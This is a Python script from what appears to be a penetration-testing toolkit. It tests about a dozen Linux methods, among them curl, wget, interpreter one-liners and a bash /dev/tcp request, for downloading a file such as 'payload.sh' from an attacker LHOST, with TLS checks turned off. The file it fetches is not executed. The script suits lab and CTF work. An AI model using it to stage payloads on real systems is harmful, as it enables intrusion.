#!/usr/bin/env python3
"""Linux download tester for the File Transfer Arsenal.

Tries common Linux download methods against one URL. The downloaded file is
never executed.

Quick mode stops at the first working method. --all runs the full matrix,
writes a log/CSV and compares the SHA-256 of every successful download.
"""
from __future__ import annotations

import argparse
import csv
import hashlib
import os
import shlex
import shutil
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

VERSION = "1.0"


def human_size(size: int | None) -> str:
    if size is None:
        return "-"
    for unit in ("B", "KiB", "MiB", "GiB"):
        if size < 1024 or unit == "GiB":
            return f"{size:.1f} {unit}" if unit != "B" else f"{size} B"
        size /= 1024
    return f"{size} B"


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def which(name: str) -> str | None:
    return shutil.which(name)


def build_methods(url: str, out: Path, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlsplit(url)
    https = parsed.scheme == "https"
    methods: list[dict] = []

    def add(name: str, tag: str, available: bool, command: list[str] | None = None, env: dict | None = None) -> None:
        methods.append({
            "name": name,
            "tag": tag,
            "available": available,
            "command": command,
            "env": env or {},
        })

    add("curl", "native", bool(which("curl")),
        ["curl", "-fsSL", "--max-time", str(timeout)] + (["-k"] if https else []) + ["-o", str(out), url])

    add("wget", "native", bool(which("wget")),
        ["wget", "-q", "--timeout", str(timeout), "-O", str(out)] + (["--no-check-certificate"] if https else []) + [url])

    py = which("python3") or sys.executable
    py_code = (
        "import ssl,sys,shutil,urllib.request;"
        "ctx=ssl._create_unverified_context() if sys.argv[3]=='1' else None;"
        "r=urllib.request.urlopen(sys.argv[1],context=ctx);"
        "f=open(sys.argv[2],'wb');shutil.copyfileobj(r,f);f.close();r.close()"
    )
    add("python3", "interpreter", bool(py), [py, "-c", py_code, url, str(out), "1" if https else "0"])

    add("perl", "interpreter", bool(which("perl")),
        ["perl", "-MLWP::Simple", "-e", "getstore($ARGV[0],$ARGV[1])", url, str(out)])

    add("php", "interpreter", bool(which("php")),
        ["php", "-r", "file_put_contents($argv[2], file_get_contents($argv[1]));", url, str(out)])

    add("ruby", "interpreter", bool(which("ruby")),
        ["ruby", "-rnet/http", "-e", "File.binwrite(ARGV[1], Net::HTTP.get(URI(ARGV[0])))", url, str(out)])

    node_code = (
        "const lib=process.argv[3]==='1'?require('https'):require('http');"
        "lib.get(process.argv[1],r=>{const f=require('fs').createWriteStream(process.argv[2]);r.pipe(f);});"
    )
    add("node", "interpreter", bool(which("node")),
        ["node", "-e", node_code, url, str(out), "1" if https else "0"],
        {"NODE_TLS_REJECT_UNAUTHORIZED": "0"} if https else {})

    bash = which("bash")
    bash_ok = bool(bash and parsed.scheme == "http")
    bash_code = None
    if bash_ok:
        host = parsed.hostname or ""
        port = parsed.port or 80
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        bash_code = (
            f"exec 3<>/dev/tcp/{host}/{port} || exit 1; "
            f"printf 'GET {path} HTTP/1.0\\r\\nHost: {host}\\r\\nConnection: close\\r\\n\\r\\n' >&3; "
            f"sed '1,/^\\r\\{{0,1\\}}$/d' <&3 > {shlex.quote(str(out))}; exec 3<&-"
        )
    add("bash-devtcp", "shell", bash_ok, [bash, "-c", bash_code] if bash_code else None)

    add("busybox-wget", "native", bool(which("busybox")),
        ["busybox", "wget", "-q", "-O", str(out), url])

    add("lynx", "native", bool(which("lynx")),
        ["bash", "-c", "lynx -source \"$1\" > \"$2\"", "_", url, str(out)])

    add("aria2c", "native", bool(which("aria2c")),
        ["aria2c", "-q", "--allow-overwrite=true", "--auto-file-renaming=false",
         "-d", str(out.parent), "-o", out.name, url])

    add("axel", "native", bool(which("axel")),
        ["axel", "-q", "-o", str(out), url])

    return methods


def run_method(method: dict, out: Path, timeout: int) -> tuple[str, int | None, str, float, str]:
    if not method["available"] or not method["command"]:
        return "SKIP", None, "", 0.0, "client not installed"
    if out.exists():
        out.unlink()
    started = time.monotonic()
    env = os.environ.copy()
    env.update(method["env"])
    error = ""
    try:
        result = subprocess.run(
            method["command"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout, env=env,
        )
        if result.returncode != 0:
            error = (result.stderr or result.stdout or f"exit {result.returncode}").strip().splitlines()[-1]
    except subprocess.TimeoutExpired:
        error = f"timeout after {timeout}s"
    except Exception as exc:  # noqa: BLE001 - report the client failure as-is
        error = str(exc).splitlines()[0]
    elapsed = time.monotonic() - started

    if not out.exists():
        return "FAIL", None, "", elapsed, error or "file not created"
    size = out.stat().st_size
    if size <= 0:
        return "FAIL", 0, "", elapsed, error or "file is empty"
    return "OK", size, sha256(out), elapsed, error


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Linux download tester. The downloaded file is never executed.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  ./Linux-download-test.py 10.10.14.5 -p 8000\n"
            "  ./Linux-download-test.py 10.10.14.5 -p 8000 -f payload.sh --all\n"
            "  ./Linux-download-test.py 10.10.14.5 -p 443 -f payload.sh --scheme https --all\n"
            "  ./Linux-download-test.py --url ftp://10.10.14.5:2121/payload.sh --all\n"
        ),
    )
    parser.add_argument("lhost", nargs="?", help="LHOST address or hostname")
    parser.add_argument("-p", "--port", type=int, default=8000, help="TCP port (default: 8000)")
    parser.add_argument("-f", "--file", default="payload.sh", help="remote file name (default: payload.sh)")
    parser.add_argument("-d", "--destination", default="/tmp", help="local directory (default: /tmp)")
    parser.add_argument("--scheme", choices=["http", "https"], default="http", help="URL scheme (default: http)")
    parser.add_argument("--url", help="full URL; overrides scheme/LHOST/port/file")
    parser.add_argument("--timeout", type=int, default=20, help="per-method timeout in seconds (default: 20)")
    parser.add_argument("--sha256", help="expected SHA-256 of the file")
    parser.add_argument("--only", help="comma-separated method names")
    parser.add_argument("--all", "--full", dest="all", action="store_true", help="run every method and write a log/CSV")
    parser.add_argument("--log", action="store_true", help="write a log/CSV in quick mode")
    parser.add_argument("--no-logs", action="store_true", help="quiet quick mode; no log/CSV")
    parser.add_argument("--list", action="store_true", help="list methods and availability")
    parser.add_argument("--version", action="version", version=VERSION)
    args = parser.parse_args()

    if args.list:
        for method in build_methods("http://127.0.0.1:8000/payload.sh", Path("/tmp/x"), args.timeout):
            print(f"{method['name']:<16} {'available' if method['available'] else 'missing'}")
        return 0

    if not args.lhost and not args.url:
        parser.error("LHOST is required unless --url is used")

    url = args.url or f"{args.scheme}://{args.lhost}:{args.port}/{args.file}"
    destination = Path(args.destination).expanduser().resolve()
    destination.mkdir(parents=True, exist_ok=True)
    if not os.access(destination, os.W_OK):
        print(f"Cannot write to {destination}", file=sys.stderr)
        return 1

    name = Path(urllib.parse.urlsplit(url).path).name or args.file
    stem, extension = os.path.splitext(name)
    if not extension:
        extension = ".bin"

    only = {item.strip() for item in args.only.split(",") if item.strip()} if args.only else None
    target = destination / "__tabula_target__"
    methods = build_methods(url, target, args.timeout)
    if only:
        methods = [method for method in methods if method["name"] in only]

    write_log = (args.all or args.log) and not args.no_logs
    quiet = args.no_logs and not args.all
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_path = destination / f"Linux-download-test-{stamp}.log"
    csv_path = destination / f"Linux-download-test-{stamp}.csv"
    expected = args.sha256.lower() if args.sha256 else None
    reference_hash = expected
    results: list[dict] = []

    def log(message: str) -> None:
        line = f"[{datetime.now():%H:%M:%S}] {message}"
        if not quiet:
            print(line)
        if write_log:
            with log_path.open("a", encoding="utf-8") as handle:
                handle.write(line + "\n")

    log(f"URL: {url}")
    log(f"Destination: {destination}")

    for index, method in enumerate(methods, 1):
        if quiet:
            out = destination / name
        else:
            out = destination / f"{stem}-{method['name']}{extension}"
        # Replace the placeholder output path in the command list. aria2c
        # uses the file name only, while the other clients use the full path.
        method["command"] = [
            str(part).replace(str(target), str(out)).replace(target.name, out.name)
            for part in (method["command"] or [])
        ]

        status, size, digest, elapsed, error = run_method(method, out, args.timeout)
        result = {
            "Method": method["name"], "Tag": method["tag"], "Status": status,
            "Bytes": size, "SHA256": digest, "Seconds": round(elapsed, 2), "Error": error,
        }
        results.append(result)

        if status == "OK" and reference_hash is None:
            reference_hash = digest
        if status == "OK" and reference_hash and digest != reference_hash:
            result["Error"] = "SHA-256 mismatch"
            status = "MISMATCH"
            result["Status"] = status

        if not args.all and status != "OK" and out.exists():
            out.unlink()

        if not quiet:
            size_text = human_size(size)
            print(f"[{status:<8}] {method['name']:<16} {size_text:>10} {elapsed:6.2f}s  {error}")
        else:
            print(f"{method['name']}: {status}")

        if status == "OK" and not args.all:
            break

    if write_log:
        with csv_path.open("w", newline="", encoding="utf-8") as handle:
            writer = csv.DictWriter(handle, fieldnames=["Method", "Tag", "Status", "Bytes", "SHA256", "Seconds", "Error"])
            writer.writeheader()
            writer.writerows(results)
        log(f"Log: {log_path}")
        log(f"CSV: {csv_path}")

    ok = [result for result in results if result["Status"] == "OK"]
    if expected:
        mismatched = [result for result in ok if result["SHA256"] != expected]
        if mismatched:
            print("SHA-256 mismatch for: " + ", ".join(result["Method"] for result in mismatched), file=sys.stderr)
            return 1
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
